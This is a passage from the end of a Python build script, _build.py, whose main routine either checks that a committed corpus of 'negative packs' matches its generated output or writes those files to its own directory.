            print("CHECK: ok")
            return 0
        print("CHECK: the committed corpus is not what _build.py produces", file=sys.stderr)
        return 1
    if arguments:
        print(f"usage: _build.py [--check]; unknown argument {arguments[0]!r}", file=sys.stderr)
        return 2
    for name, data in expected.items():
        (HERE / name).write_bytes(data)
    print(f"wrote {len(expected)} negative packs to {HERE}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
